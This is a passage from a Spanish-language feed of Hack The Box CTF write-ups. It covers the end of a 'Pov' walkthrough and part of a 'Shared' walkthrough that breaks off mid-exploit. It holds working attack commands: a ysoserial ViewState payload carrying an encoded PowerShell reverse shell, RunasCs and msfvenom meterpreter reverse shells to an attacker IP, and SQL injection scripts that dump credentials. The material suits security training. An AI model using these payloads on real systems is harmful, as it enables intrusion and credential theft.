&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;http&lt;/td&gt;
&lt;td&gt;Microsoft IIS httpd&lt;/td&gt;
&lt;td&gt;10.0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Solo encontramos un puerto, que en este caso es una Web:&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos en el sitio pero no encontramos nada interesante.&lt;/p&gt;
&lt;h3&gt;Searching Subdomains&lt;/h3&gt;
&lt;p&gt;Hacemos fuzzing de subdominios:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ffuf -u http://10.10.11.251 -H &quot;Host: FUZZ.pov.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un subdominio llamado &lt;code&gt;dev.pov.htb&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Si investigamos un poco la página, podemos ver que en varias partes menciona ASP.NET, lo que ya nos deja claro que la página está hecha en este.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;En el botón de descargar cv podemos ver esto:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Enviamos la solicitud a la burpsuite&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Si nos fijamos en el parámetro &lt;code&gt;file&lt;/code&gt; está llamando al pdf de la CV&lt;/p&gt;
&lt;h3&gt;Directory Traversal&lt;/h3&gt;
&lt;p&gt;Podemos intentar ver el fichero &lt;code&gt;etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;hay un archivo llamado &lt;code&gt;web.config&lt;/code&gt;, que puede ser de interés:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Ysoserial&lt;/h3&gt;
&lt;p&gt;Vamos a generar un payload con la herramienta Ysoserial que nos permite crearlos en .NET:
https://github.com/pwntester/ysoserial.net&lt;/p&gt;
&lt;p&gt;Usamos el powershell base64:
https://www.revshells.com/&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ejecutamos esto desde una máquina windows para crear la cadena que vamos a enviar a la máquina víctima:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;./ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot; --path=&quot;/portfolio&quot; -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADkAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Insertamos nuestro payload en el parámetro &lt;code&gt;VIEWSTATE&lt;/code&gt;, como sigue:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/11.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Estoy escuchando en el puerto 9001:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo rlwrap -cAr nc -lvnp 9001 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Después de buscar en diferentes rutas de máquinas:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Path                    
----                    
C:\Users\sfitz\Documents
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Lateral Movement&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;podemos ver un archivo xml que contiene lo siguiente:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&amp;gt;
  &amp;lt;Obj RefId=&quot;0&quot;&amp;gt;
    &amp;lt;TN RefId=&quot;0&quot;&amp;gt;
      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;
      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
    &amp;lt;/TN&amp;gt;
    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;
    &amp;lt;Props&amp;gt;
      &amp;lt;S N=&quot;UserName&quot;&amp;gt;alaading&amp;lt;/S&amp;gt;
      &amp;lt;SS N=&quot;Password&quot;&amp;gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&amp;lt;/SS&amp;gt;
    &amp;lt;/Props&amp;gt;
  &amp;lt;/Obj&amp;gt;
&amp;lt;/Objs&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Utilizaré el comando PowerShell &lt;code&gt;Import-CliXml&lt;/code&gt; para leer el fichero y obtener la contraseña en texto plano&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$cred = Import-CliXml -Path connection.xml
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$cred.GetNetworkCredential().Password
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;llevamos las runas a la máquina víctima:&lt;/p&gt;
&lt;p&gt;https://github.com/antonioCoco/RunasCs&lt;/p&gt;
&lt;p&gt;Creamos un servidor smb para pasar este archivo a la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo impacket-smbserver share -smb2support /tmp/share -user test -password test 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;crear una carpeta tmp en &lt;code&gt;C:\&lt;/code&gt; en la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net use n: \\10.10.14.109\share /user:test test
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;copy n:\RunasCs.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I run the runas:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.109:4444
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;estamos escuchando:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rlwrap -cAr nc -lnvp 4444
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;desde el powershell podemos ver este &lt;code&gt;priv&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;What is SeDebugPrivilege?&lt;/h3&gt;
&lt;p&gt;hl privilegio SeDebugPrivilege en Windows permite a un usuario realizar depuración a nivel de sistema. En términos simples, con este privilegio, un usuario puede:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Accede a todos los procesos del sistema:
Incluidos los que normalmente están protegidos y son inaccesibles, como los procesos del sistema operativo y los servicios críticos.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Modificar o finalizar procesos protegidos:
El usuario puede terminar procesos que los usuarios estándar normalmente no podrían detener.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Leer y escribir en la memoria de cualquier proceso:
Esto incluye la capacidad de inyectar código o realizar modificaciones en tiempo real en los procesos en ejecución.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Este privilegio es muy poderoso y suele estar reservado a las cuentas del sistema y a los administradores, ya que puede utilizarse para saltarse casi todas las medidas de seguridad del sistema operativo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/13.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Creamos un archivo con msfvenom:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.109 LPORT=6969 -f exe -o platanoo.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pasamos el archivo de vuelta a la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo impacket-smbserver share -smb2support /tmp/share -user test -password test
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;net use n: \\10.10.14.109\share /user:test test
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;copy n:\platanoo.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ahora estamos escuchando al meterpreter:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msfconsole
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; use exploit/multi/handler
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; set payload windows/x64/meterpreter/reverse_tcp
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;set LHOST tun0
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;set LPORT 6969
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;run
[*] Started reverse TCP handler on 10.10.14.109:6969 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora ejecutamos el .exe en la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./platanoo.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/14.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Migraremos a este proceso&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 552
[*] Migrating from 2032 to 552...
[*] Migration completed successfully.
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
Server username: NT AUTHORITY\SYSTEM
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Shared HTB Writeup</title><link>https://fuwari.vercel.app/posts/shared/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/shared/</guid><description>Medium Machine</description><pubDate>Sat, 01 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Shared es una máquina Linux mediana creada por Nauten en Hack The Box que presenta un sitio web con un nombre de host virtual que es vulnerable a la inyección SQL. La explotación exitosa de esta vulnerabilidad nos proporciona la contraseña de un usuario llamado james_mason. Con estas credenciales somos capaces de iniciar sesión a través de SSH y elevar privilegios a un usuario llamado dan_smith explotando un cron job que utiliza una versión de ipython que es vulnerable a CVE-2022-21699. A continuación, aplicamos ingeniería inversa a un ejecutable utilizando análisis estáticos y dinámicos para recuperar la contraseña del servicio local Redis. El proceso Redis se ejecuta como root, por lo que cargamos un módulo especial de objetos compartidos utilizando LOAD MODULE para ejecutar comandos como root.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Primero configuremos nuestro entorno y ejecutemos un escaneo de puertos TCP con esta envoltura nmap personalizada.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Mhil4ne@Kali
export rhost=&quot;10.10.10.x&quot;
sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv  $rhost -oG nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El análisis informa de que los servicios SSH, HTTP y HTTPS se ejecutan en los puertos 22, 80 y 443 respectivamente.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Al visitar el puerto 80, se nos redirige a shared.htb. Añadamos este nombre de host a nuestro archivo /etc/hosts{:.filepath} con la dirección IP correspondiente.&lt;/p&gt;
&lt;p&gt;Ahora visitaremos https://shared.htb/ en una sesión de navegador proxy a través del proxy HTTP BurpSuite.&lt;/p&gt;
&lt;p&gt;Página de índice
Página de índice de la web shared.htb&lt;/p&gt;
&lt;h3&gt;Walking the Application&lt;/h3&gt;
&lt;p&gt;Al explorar el contenido del sitio web, descubrimos la página de pago en /index.php?controller=cart&amp;amp;action=show. Cuando pasamos el ratón por encima del botón de pago, podemos ver que nos enviará a https://checkout.shared.htb. Añadamos este nombre de host virtual a nuestro archivo /etc/hosts{:.filepath} para poder ver su contenido.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo sed -E -i &apos;s/(shared.htb).*/\1 checkout.\1/&apos; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora, cuando añadamos un artículo a nuestro carrito y naveguemos a /index.php?controller=cart&amp;amp;action=show, haremos clic en el botón de pago para ser redirigidos al sitio de pago.&lt;/p&gt;
&lt;h3&gt;Investigación de la funcionalidad&lt;/h3&gt;
&lt;p&gt;Es interesante cómo este sitio es capaz de determinar qué artículo teníamos en nuestro carrito teniendo en cuenta que no proporcionamos ningún parámetro HTTP GET o POST. Vamos a investigar.&lt;/p&gt;
&lt;p&gt;Observando la solicitud inicial que enviamos al sitio de pago en el mapa del sitio de BurpSuite, podemos ver que nuestra solicitud contiene una cookie inusual llamada custom_cart. El valor de esta cookie se puede descifrar automáticamente resaltándolo, revelando un objeto JSON con el código de producto y la cantidad del artículo de pago.&lt;/p&gt;
&lt;p&gt;Encontramos una misteriosa cookie en BurpSuite&lt;/p&gt;
&lt;p&gt;Podemos deducir que el sitio utiliza el código de producto suministrado en custom_cart para encontrar el precio del artículo, ya que no suministramos el precio, sino sólo el código de producto. Es probable que esta actividad sea gestionada por algún tipo de solución de base de datos, como un servidor SQL. Teniendo esto en cuenta, podemos comprobar si esta funcionalidad es vulnerable a la inyección SQL.&lt;/p&gt;
&lt;h3&gt;Descubrimiento de vulnerabilidades&lt;/h3&gt;
&lt;p&gt;Introduzcamos algunas cargas útiles básicas de inyección SQL en la cookie de la pestaña de repetición de BurpSuite para ver si es posible la inyección SQL.&lt;/p&gt;
&lt;p&gt;Respuesta del servidor a una carga útil de inyección SQL común&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&quot;CRAAFTKP&apos;#&quot;:&quot;1&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;La respuesta a la primera carga útil sugiere que la inyección SQL es posible, pero podemos asegurarnos enviando una carga útil que debería evaluarse como falsa, y otra que debería ser verdadera.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3

from urllib.parse import quote
from sys import argv

if len(argv) == 2:
        sqli = argv[1]
        sqli = sqli.replace(&apos;\\&apos;, &apos;\\\\&apos;)
        sqli = sqli.replace(&apos;&quot;&apos;,&apos;\\&quot;&apos;)
        print(quote(&apos;{&quot;&apos; + argv[1] + &apos;&quot;:&quot;1&quot;}&apos;))
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;chmod +x makepayload.py
true=$(./makepayload.py &quot;&apos; OR 1=1#&quot;) # Always resolves to true
false=$(./makepayload.py &quot;&apos; AND 1=2#&quot;) # Always resolves to false

url=&quot;https://checkout.shared.htb&quot;
curl -k -s $url -b &quot;custom_cart=$true&quot; | sed &apos;s/^ *//&apos; &amp;gt; true.html
curl -k -s $url -b &quot;custom_cart=$false&quot; | sed &apos;s/^ *//&apos; &amp;gt; false.html
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Esto debería dejarte con dos archivos llamados false.html{:.filepath} y true.html{:.filepath}. Para encontrar la diferencia entre los dos cuerpos de respuesta podemos usar diff.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;diff false.html true.html
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;37,39c37,39
&amp;lt; &amp;lt;td&amp;gt;Not Found&amp;lt;/td&amp;gt;
&amp;lt; &amp;lt;td&amp;gt;0&amp;lt;/td&amp;gt;
&amp;lt; &amp;lt;td&amp;gt;$0,00&amp;lt;/td&amp;gt;
---
&amp;gt; &amp;lt;td&amp;gt;53GG2EF8&amp;lt;/td&amp;gt;
&amp;gt; &amp;lt;td&amp;gt;1&amp;lt;/td&amp;gt;
&amp;gt; &amp;lt;td&amp;gt;$23,90&amp;lt;/td&amp;gt;
45c45
&amp;lt; &amp;lt;th scope=&quot;col&quot;&amp;gt;$0,00&amp;lt;/th&amp;gt;
---
&amp;gt; &amp;lt;th scope=&quot;col&quot;&amp;gt;$23,90&amp;lt;/th&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;La consulta falsa devuelve «No encontrado» y valores cero para la cantidad y el precio, mientras que la consulta verdadera devuelve una entrada de producto. Esto es definitivamente suficiente evidencia de una vulnerabilidad de inyección SQL para comenzar la explotación.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web Exploitation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Ya hemos determinado que la inyección SQL ciega basada en booleanos es posible con las consultas true y false, pero hay muchas posibilidades de que podamos utilizar las consultas UNION SELECT para filtrar valores de la base de datos sin tener que utilizar un canal secundario.&lt;/p&gt;
&lt;h3&gt;Union Query Exfiltration&lt;/h3&gt;
&lt;p&gt;Primero vamos a averiguar el número de columnas de la consulta original para poder compararlo con nuestra extensión UNION SELECT.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload=$(./makepayload.py &quot;&apos; UNION SELECT &apos;c0lumn1&apos;,&apos;c0lumn2&apos;,&apos;c0lumn3&apos;#&quot;)

curl -k -s &quot;https://checkout.shared.htb&quot; -b &quot;custom_cart=$payload&quot; | \
	sed &apos;s/^ *//&apos; |
	egrep &apos;&amp;lt;/?td&amp;gt;&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;td&amp;gt;c0lumn2&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;1&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;$&amp;lt;/td&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Observa cómo la respuesta contiene el valor que enviamos en la segunda columna. Esto significa que podemos extraer datos a través de la segunda columna. Ahora vamos a crear un script para obtener cualquier valor en bruto de la base de datos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash

[ -z &quot;$SELECT&quot; ] &amp;amp;&amp;amp; echo &quot;SELECT=* FROM=* WHERE=* $0&quot; &amp;amp;&amp;amp; exit

payload=&quot;&apos; UNION SELECT &apos;&apos;,$SELECT,&apos;&apos;&quot;

[ -z &quot;$FROM&quot; ] || payload=&quot;$payload FROM $FROM&quot;
[ -z &quot;$WHERE&quot; ] || payload=&quot;$payload WHERE $WHERE&quot; 

echo $payload

payload=$(./makepayload.py &quot;$payload#&quot;)

curl -k -s &quot;https://checkout.shared.htb&quot; -b &quot;custom_cart=$payload&quot; |
	egrep &apos;&amp;lt;/?td&amp;gt;&apos; |
	head -1 |
	sed -E &apos;s/^ *&amp;lt;td&amp;gt;(.*)&amp;lt;\/td&amp;gt;$/\1/&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Entonces podemos ver si podemos obtener los nombres de las bases de datos disponibles. Recuerde que esta base de datos es probablemente MySQL porque el # comentario está funcionando.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod +x sqli.sh
SELECT=&quot;group_concat(schema_name)&quot;   \
FROM=&quot;information_schema.schemata&quot;   \
	./sqli.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;information_schema,checkout
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Hay una base de datos llamada checkout que deberíamos explorar. Busquemos los nombres de sus tablas.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT=&quot;group_concat(table_name)&quot;   \
FROM=&quot;information_schema.tables&quot;    \
WHERE=&quot;table_schema=&apos;checkout&apos;&quot;     \
	./sqli.sh

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;user,product
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;La tabla de usuarios parece interesante. Busquemos los nombres de las columnas y volquemos el contenido de la tabla.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT=&quot;group_concat(column_name)&quot;   \
FROM=&quot;information_schema.columns&quot;    \
WHERE=&quot;table_name=&apos;user&apos;&quot;            \
	./sqli.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;id,username,password
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;SELECT=&quot;group_concat(concat(id,0x7c,username,0x7c,password))&quot; \
FROM=&quot;checkout.user&quot; \
	./sqli.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;1|james_mason|[REDACTED]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Sólo hay un resultado, pero tenemos lo que parece un hash MD5 en la columna de contraseña para el usuario james_mason.&lt;/p&gt;
&lt;h3&gt;Shell as james_mason&lt;/h3&gt;
&lt;p&gt;ntentemos descifrar el hash usando a John the Ripper&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
hash=&quot;&quot; # Hash here
echo &quot;james_mason:$hash&quot; &amp;gt; md5.john
john md5.john \
	--format=&quot;raw-md5&quot; \
	--wordlist=&quot;rockyou.txt&quot; # classic rockyou.txt wordlist
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Usando estas credenciales en el servidor SSH del objetivo obtendremos un shell como james_mason.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
ssh &quot;james_mason@$rhost&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;No hay ninguna bandera de usuario en nuestro directorio de inicio, por lo que puede que tengamos que hacer algún movimiento lateral.&lt;/p&gt;
&lt;h3&gt;Lateral Movement&lt;/h3&gt;
&lt;p&gt;Usaremos LinPEAS de PEASS-ng para buscar cualquier información útil en la máquina. También usaremos pspy para husmear en los procesos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
lhost=&quot;10.10.14.10&quot; # Listener host
cd $(mktemp -d)
wget \
	&quot;https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64&quot; \
	&quot;https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh&quot;
php -S $lhost:80
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
lhost=&quot;10.10.14.10&quot; # Attacker&apos;s IP address
mkdir .sneak &amp;amp;&amp;amp; cd .sneak
wget &quot;http://$lhost/pspy64&quot; &quot;http://$lhost/linpeas.sh&quot;
bash ./linpeas.sh | tee linpeas.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;No obtenemos nada que destaque en la salida de LinPEAS. Intentemos ejecutar PSpy durante unos minutos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
chmod +x pspy64
timeout 3m ./pspy64 | tee pspy.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Mirando la salida, el UID 0 y el UID 1001 parecen estar ejecutando comandos rutinarios. El UID 0 es root y el ID de usuario 1001 resulta ser el usuario dan_smith, declarado en &lt;code&gt;/etc/passwd{:.filepath}&lt;/code&gt;. Se puede observar que dan_smith ejecuta un comando interesante cada minuto.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;amp;&amp;amp; /usr/local/bin/ipython
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El usuario entra en el directorio &lt;code&gt;/opt/scripts_review{:.filepath}&lt;/code&gt; y ejecuta &lt;code&gt;/usr/local/bin/ipython{:.filepath}&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;CVE-2022-21699&lt;/h3&gt;
&lt;p&gt;Tras investigar un poco sobre ipython, nos encontramos con un aviso de vulnerabilidad que detalla un fallo de ejecución de código.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Nos gustaría revelar una vulnerabilidad de ejecución de código arbitrario en IPython que proviene de IPython ejecutando archivos no confiables en CWD. Esta vulnerabilidad permite a un usuario ejecutar código como otro.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Comprobemos si la versión de la máquina es vulnerable.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
/usr/local/bin/ipython --version
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;La versión es 8.0.0, que es vulnerable. Dado que el comando de rutina ejecutado por dan_smith se ejecuta en el directorio &lt;code&gt;/opt/scripts_review{:.filepath}&lt;/code&gt;, podríamos explotar la vulnerabilidad si &lt;code&gt;/opt/scripts_review{:.filepath}&lt;/code&gt; es escribible.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
ls -la /opt/scripts_review
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Es escribible por aquellos en el grupo de desarrolladores. Según la salida del comando id, nuestro usuario actual forma parte de este grupo.&lt;/p&gt;
&lt;h3&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Pongamos a prueba nuestra hipótesis siguiendo las instrucciones del aviso para ejecutar código como &lt;code&gt;dan_smith&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash

exploitdir=&quot;/opt/scripts_review&quot;
